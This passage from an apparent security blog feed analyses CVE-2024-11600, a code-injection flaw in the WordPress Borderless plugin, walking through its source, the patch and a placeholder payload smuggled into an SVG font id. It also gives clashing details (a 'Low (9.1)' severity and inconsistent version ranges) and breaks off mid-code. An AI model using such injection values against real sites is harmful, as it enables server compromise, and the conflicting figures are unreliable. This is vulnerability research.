.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Authentication ≠ Authorization&lt;/li&gt;&#xA;&lt;li&gt;Avoid using &lt;strong&gt;default = all&lt;/strong&gt; for sensitive permissions&lt;/li&gt;&#xA;&lt;li&gt;Custom permissions should map correctly to &lt;strong&gt;WordPress core capabilities&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Endpoints that modify &lt;strong&gt;global settings&lt;/strong&gt; must require high privileges (Admin/Editor)&lt;/li&gt;&#xA;&lt;li&gt;Comparing (diff) vulnerable vs patched versions is a quick way to spot permission logic errors&lt;/li&gt;&#xA;&lt;li&gt;Multiple layers of permission checks are needed for critical actions&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/broken-access-control/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Broken Access Control&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/beaver-builder-lite-version/vulnerability/wordpress-beaver-builder-wordpress-page-builder-plugin-2-9-4-missing-authorization-to-authenticated-contributor-global-preset-modification-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Beaver Builder Plugin &amp;lt;= 2.9.4 is vulnerable to Broken Access Control&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2024-11600 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-12-06-cve-2024-11600/</link>
      <pubDate>Sat, 06 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-06-cve-2024-11600/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-06-cve-2024-11600/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The WordPress plugin &lt;strong&gt;The Borderless – Widgets, Elements, Templates and Toolkit for Elementor &amp;amp; Gutenberg&lt;/strong&gt; contains a &lt;strong&gt;Remote Code Execution&lt;/strong&gt; vulnerability in all versions up to and including &lt;strong&gt;1.5.9&lt;/strong&gt; via the &lt;strong&gt;write_config&lt;/strong&gt; function. The root cause is improper &lt;strong&gt;sanitization&lt;/strong&gt; of an imported &lt;strong&gt;JSON&lt;/strong&gt; file. This allows an authenticated attacker with &lt;strong&gt;Administrator-level access&lt;/strong&gt; or higher to execute code on the server.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2024-11600&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2024-11600&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Remote Code Execution&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.6.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.6.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (9.1)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Administrator&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/borderless/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Borderless Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version – Borderless&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;1.6.0&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;1.6.1&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any other diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;In the vulnerable version (v1.6.0):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function write_config() {&#xA;    $charmap = $this-&amp;gt;paths[&amp;#39;tempdir&amp;#39;] . &amp;#39;/&amp;#39; . $this-&amp;gt;paths[&amp;#39;config&amp;#39;];&#xA;    $handle  = @fopen( $charmap, &amp;#39;w&amp;#39; );&#xA;    if ( $handle ) {&#xA;        fwrite( $handle, &amp;#39;&amp;lt;?php $icons = array();&amp;#39; );&#xA;        &#xA;        // Safely build the PHP array with sanitized content&#xA;        foreach ( $this-&amp;gt;json_config[ $this-&amp;gt;ip_name ] as $icon =&amp;gt; $info ) {&#xA;            if ( ! empty( $info ) ) {&#xA;                $delimiter   = &amp;#34;&amp;#39;&amp;#34;;&#xA;                $safe_icon   = esc_attr( $icon );&#xA;                $safe_class  = esc_attr( $info[&amp;#34;class&amp;#34;] );&#xA;                $safe_tags   = esc_attr( $info[&amp;#34;tags&amp;#34;] );&#xA;&#xA;                fwrite( $handle, &amp;#34;\r\n&amp;#34; . &amp;#39;$icons[\&amp;#39;&amp;#39; . $this-&amp;gt;ip_name . &amp;#39;\&amp;#39;][&amp;#39; . $delimiter . $safe_icon . $delimiter . &amp;#39;] = array(&amp;#34;class&amp;#34;=&amp;gt;&amp;#39; . $delimiter . $safe_class . $delimiter . &amp;#39;,&amp;#34;tags&amp;#34;=&amp;gt;&amp;#39; . $delimiter . $safe_tags . $delimiter . &amp;#39;);&amp;#39; );&#xA;            } else {&#xA;                $this-&amp;gt;delete_folder( $this-&amp;gt;paths[&amp;#39;tempdir&amp;#39;] );&#xA;                die( esc_html__( &amp;#39;Error generating the configuration file.&amp;#39;, &amp;#39;borderless&amp;#39; ) );&#xA;            }&#xA;        }&#xA;        fclose( $handle );&#xA;    } else {&#xA;        $this-&amp;gt;delete_folder( $this-&amp;gt;paths[&amp;#39;tempdir&amp;#39;] );&#xA;        die( esc_html__( &amp;#39;Error generating the configuration file.&amp;#39;, &amp;#39;borderless&amp;#39; ) );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;write_config()&lt;/code&gt; function writes the icon configuration into a PHP file. Each icon is stored as:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$icons[&amp;#39;&amp;lt;ip_name&amp;gt;&amp;#39;][&amp;#39;&amp;lt;icon_name&amp;gt;&amp;#39;] = array(&amp;#34;class&amp;#34;=&amp;gt;&amp;#39;&amp;lt;class&amp;gt;&amp;#39;,&amp;#34;tags&amp;#34;=&amp;gt;&amp;#39;&amp;lt;tags&amp;gt;&amp;#39;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Before being written to the file, this value is taken from the &lt;code&gt;id&lt;/code&gt; attribute of the &lt;code&gt;&amp;lt;font&amp;gt;&lt;/code&gt; tag in the SVG and passed through:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$this-&amp;gt;ip_name = (string) $font_attr[&amp;#39;id&amp;#39;];&#xA;$this-&amp;gt;ip_name = sanitize_text_field( $this-&amp;gt;ip_name );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;sanitize_text_field()&lt;/code&gt; only removes HTML tags, control characters, and excessive whitespace. It does &lt;strong&gt;not&lt;/strong&gt; prevent dangerous special characters in a PHP context (such as &lt;code&gt;&#39;&lt;/code&gt;, &lt;code&gt;]&lt;/code&gt;, &lt;code&gt;;&lt;/code&gt;).&lt;/p&gt;&#xA;&lt;p&gt;As a result, an attacker can inject a payload into the &lt;code&gt;id&lt;/code&gt; attribute of the SVG:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;font id=&amp;#34;&amp;#39;]; php_code;//&amp;#34;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The line written to the file then becomes:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$icons[&amp;#39;&amp;#39;]; php_code;//&amp;#39;][&amp;#39;&amp;lt;icon_name&amp;gt;&amp;#39;] = array(&amp;#34;class&amp;#34;=&amp;gt;&amp;#39;&amp;lt;class&amp;gt;&amp;#39;,&amp;#34;tags&amp;#34;=&amp;gt;&amp;#39;&amp;lt;tags&amp;gt;&amp;#39;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;The patch (v1.6.1):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$this-&amp;gt;ip_name = sanitize_file_name( $this-&amp;gt;ip_name );&#xA;if ( empty( $this-&amp;gt;ip_name ) ) {&#xA;    $this-&amp;gt;ip_name = &amp;#39;unknown&amp;#39;;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The patch replaces &lt;code&gt;sanitize_text_field()&lt;/code&gt; with &lt;code&gt;sanitize_file_name()&lt;/code&gt;, which removes all dangerous special characters (&lt;code&gt;&#39;&lt;/code&gt;, &lt;code&gt;&amp;quot;&lt;/code&gt;, &lt;code&gt;;&lt;/code&gt;, &lt;code&gt;|&lt;/code&gt;, &lt;code&gt;..&lt;/code&gt;, whitespace, complex Unicode, etc.) and normalizes the string into a safe file/key name. This prevents payload injection that could break PHP syntax in the configuration file.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-06-cve-2024-11600/diff.png&#34; title=&#34;Changes introduced by the patch&#34; data-thumbnail=&#34;/posts/2025-12-06-cve-2024-11600/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Changes introduced by the patch&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-06-cve-2024-11600/diff.png&#39; alt=&#34;Diff&#34; height=&#34;146&#34; width=&#34;1864&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Changes introduced by the patch&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers a submenu:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function borderless_icon_fonts_submenu() {&#xA;    $icon_manager_page = add_submenu_page(&#xA;        &amp;#39;borderless.php&amp;#39;,&#xA;        esc_html__( &amp;#34;Icon Fonts&amp;#34;, &amp;#34;borderless&amp;#34; ),&#xA;        esc_html__( &amp;#34;Icon Fonts&amp;#34;, &amp;#34;borderless&amp;#34; ),&#xA;        &amp;#39;manage_options&amp;#39;,&#xA;        &amp;#39;borderless-fonts&amp;#39;,&#xA;        &amp;#39;borderless_custom_icons_menu&amp;#39;&#xA;    );&#xA;    $Borderless_IF  = new Borderless_IF;&#xA;    add_action(&amp;#39;admin_print_styles-&amp;#39; . $icon_manager_page, array( $Borderless_IF, &amp;#39;admin_scripts&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;&#39;Icon Fonts&#39;&lt;/code&gt;: submenu title&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;&#39;manage_options&#39;&lt;/code&gt;: this menu is for Administrators only&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;&#39;borderless-fonts&#39;&lt;/code&gt;: menu slug&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Corresponding in the Admin Dashboard:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-06-cve-2024-11600/dashboard.png&#34; title=&#34;Menu in the Admin Dashboard&#34; data-thumbnail=&#34;/posts/2025-12-06-cve-2024-11600/dashboard.png&#34; data-sub-html=&#34;&lt;h2&gt;Dashboard&lt;/h2&gt;&lt;p&gt;Menu in the Admin Dashboard&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-06-cve-2024-11600/dashboard.png&#39; alt=&#34;Dashboard&#34; height=&#34;523&#34; width=&#34;1864&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Menu in the Admin Dashboard&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;&#39;borderless_custom_icons_menu&#39;&lt;/code&gt;: callback executed when accessing the menu&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;function borderless_custom_icons_menu() {&#xA;    $Borderless_IF = new Borderless_IF;&#xA;    $Borderless_IF-&amp;gt;icon_pack_manager();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here, a &lt;code&gt;Borderless_IF&lt;/code&gt; object is instantiated:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class Borderless_IF {&#xA;    function __construct() {&#xA;        $this-&amp;gt;paths            = wp_upload_dir();&#xA;        $this-&amp;gt;paths[&amp;#39;fonts&amp;#39;]   = &amp;#39;borderless_icon_fonts&amp;#39;;&#xA;        $this-&amp;gt;paths[&amp;#39;temp&amp;#39;]    = trailingslashit( $this-&amp;gt;paths[&amp;#39;fonts&amp;#39;] ) . &amp;#39;borderless_temp&amp;#39;;&#xA;        $this-&amp;gt;paths[&amp;#39;fontdir&amp;#39;] = trailingslashit( $this-&amp;gt;paths[&amp;#39;basedir&amp;#39;] ) . $this-&amp;gt;paths[&amp;#39;fonts&amp;#39;];&#xA;        $this-&amp;gt;paths[&amp;#39;tempdir&amp;#39;] = trailingslashit( $this-&amp;gt;paths[&amp;#39;basedir&amp;#39;] ) . $this-&amp;gt;paths[&amp;#39;temp&amp;#39;];&#xA;        $this-&amp;gt;paths[&amp;#39;fonturl&amp;#39;] = set_url_scheme( trailingslashit( $this-&amp;gt;paths[&amp;#39;baseurl&amp;#39;] ) . $this-&amp;gt;paths[&amp;#39;fonts&amp;#39;] );&#xA;        $this-&amp;gt;paths[&amp;#39;tempurl&amp;#39;] = trailingslashit( $this-&amp;gt;paths[&amp;#39;baseurl&amp;#39;] ) . trailingslashit( $this-&amp;gt;paths[&amp;#39;temp&amp;#39;] );&#xA;        $this-&amp;gt;paths[&amp;#39;config&amp;#39;]  = &amp;#39;charmap.php&amp;#39;;&#xA;&#xA;        add_action( &amp;#39;wp_ajax_borderless_ajax_add_zipped_font&amp;#39;, array( $this, &amp;#39;add_zipped_font&amp;#39; ) );&#xA;        add_action( &amp;#39;wp_ajax_borderless_ajax_remove_zipped_font&amp;#39;, array( $this, &amp;#39;remove_zipped_font&amp;#39; ) );&#xA;    }&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The constructor initializes the necessary paths and hooks. The &lt;code&gt;write_config()&lt;/code&gt; function uses these paths to build the configuration file path:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$charmap = $this-&amp;gt;paths[&amp;#39;tempdir&amp;#39;] . &amp;#39;/&amp;#39; . $this-&amp;gt;paths[&amp;#39;config&amp;#39;];&#xA;&#xA;// &amp;lt;base_url&amp;gt;/wp-content/uploads/borderless_icon_fonts/borderless_temp/charmap.php&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The AJAX action &lt;code&gt;wp_ajax_borderless_ajax_add_zipped_font&lt;/code&gt; is registered to handle uploading and adding fonts from a ZIP file, with &lt;code&gt;add_zipped_font&lt;/code&gt; as the callback that performs extraction and writes the configuration file.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function add_zipped_font() {&#xA;    $cap = apply_filters( &amp;#39;avf_file_upload_capability&amp;#39;, &amp;#39;update_plugins&amp;#39; );&#xA;    if ( ! current_user_can( $cap ) ) {&#xA;        die( esc_html__( &amp;#34;You do not have sufficient permissions to use this feature.&amp;#34;, &amp;#34;borderless&amp;#34; ) );&#xA;    }&#xA;    // Retrieve the file path of the zip file&#xA;    $attachment = $_POST[&amp;#39;values&amp;#39;];&#xA;    $path       = realpath( get_attached_file( sanitize_text_field( $attachment[&amp;#39;id&amp;#39;] ) ) );&#xA;    $unzipped   = $this-&amp;gt;zip_flatten( $path, array( &amp;#39;\.eot&amp;#39;, &amp;#39;\.svg&amp;#39;, &amp;#39;\.ttf&amp;#39;, &amp;#39;\.woff&amp;#39;, &amp;#39;\.json&amp;#39;, &amp;#39;\.css&amp;#39; ) );&#xA;    &#xA;    // If we managed to unzip the file and save it, extract the SVG file&#xA;    if ( $unzipped ) {&#xA;        $this-&amp;gt;create_config();&#xA;    }&#xA;    &#xA;    // If we did not get a name for the font, do not add it and remove the temp folder&#xA;    if ( $this-&amp;gt;ip_name == &amp;#39;unknown&amp;#39; ) {&#xA;        $this-&amp;gt;delete_folder( $this-&amp;gt;paths[&amp;#39;tempdir&amp;#39;] );&#xA;        die( esc_html__( &amp;#39;Unable to retrieve the Icon Pack name from your uploaded folder.&amp;#39;, &amp;#39;borderless&amp;#39; ) );&#xA;    }&#xA;    die( esc_html__( &amp;#39;borderless_font_added:&amp;#39;, &amp;#39;borderless&amp;#39; ) . $this-&amp;gt;ip_name );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In &lt;code&gt;add_zipped_font()&lt;/code&gt;, after the user uploads a ZIP file containing the Icon Pack, the plugin performs these steps:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Checks for the &lt;code&gt;update_plugins&lt;/code&gt; capability → Administrator only&lt;/li&gt;&#xA;&lt;li&gt;Unzips and keeps only the necessary files for the Icon Pack: fonts (&lt;code&gt;.eot&lt;/code&gt;, &lt;code&gt;.svg&lt;/code&gt;, &lt;code&gt;.ttf&lt;/code&gt;, &lt;code&gt;.woff&lt;/code&gt;), &lt;code&gt;JSON&lt;/code&gt;, &lt;code&gt;CSS&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Calls &lt;code&gt;create_config()&lt;/code&gt; to generate the configuration file&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;function create_config() {&#xA;    $this-&amp;gt;json_file = $this-&amp;gt;find_json();&#xA;    $this-&amp;gt;svg_file  = $this-&amp;gt;find_svg();&#xA;    if ( empty( $this-&amp;gt;json_file ) || empty( $this-&amp;gt;svg_file ) ) {&#xA;        $this-&amp;gt;delete_folder( $this-&amp;gt;paths[&amp;#39;tempdir&amp;#39;] );&#xA;        die( esc_html__( &amp;#39;SVG file or selection.json not found. Please check the integrity of the Icon Pack files.&amp;#39;, &amp;#39;borderless&amp;#39; ) );&#xA;    }&#xA;&#xA;    // Attempt to read the SVG file&#xA;    $response = wp_remote_fopen( trailingslashit( $this-&amp;gt;paths[&amp;#39;tempurl&amp;#39;] ) . $this-&amp;gt;svg_file );&#xA;    $json     = file_get_contents( trailingslashit( $this-&amp;gt;paths[&amp;#39;tempdir&amp;#39;] ) . $this-&amp;gt;json_file );&#xA;&#xA;    if ( empty( $response ) ) {&#xA;        $response = file_get_contents( trailingslashit( $this-&amp;gt;paths[&amp;#39;tempdir&amp;#39;] ) . $this-&amp;gt;svg_file );&#xA;    }&#xA;&#xA;    if ( ! is_wp_error( $json ) &amp;amp;&amp;amp; ! empty( $json ) ) {&#xA;        // Load and parse the SVG&#xA;        $xml       = simplexml_load_string( $response );&#xA;        $font_attr = $xml-&amp;gt;defs-&amp;gt;font-&amp;gt;attributes();&#xA;        $glyphs    = $xml-&amp;gt;defs-&amp;gt;font-&amp;gt;children();&#xA;&#xA;        // Sanitize the font name (ip_name)&#xA;        $this-&amp;gt;ip_name = (string) $font_attr[&amp;#39;id&amp;#39;];&#xA;        $this-&amp;gt;ip_name = sanitize_text_field( $this-&amp;gt;ip_name );&#xA;&#xA;        $font_folder = trailingslashit( $this-&amp;gt;paths[&amp;#39;fontdir&amp;#39;] ) . $this-&amp;gt;ip_name;&#xA;        if ( is_dir( $font_folder ) ) {&#xA;            $this-&amp;gt;delete_folder( $this-&amp;gt;paths[&amp;#39;tempdir&amp;#39;] );&#xA;            die( esc_html__( &amp;#34;There is already an Icon Pack with this name. Please upload with another name.&amp;#34;, &amp;#34;borderless&amp;#34; ) );&#xA;        }&#xA;&#xA;        // Decode JSON content&#xA;        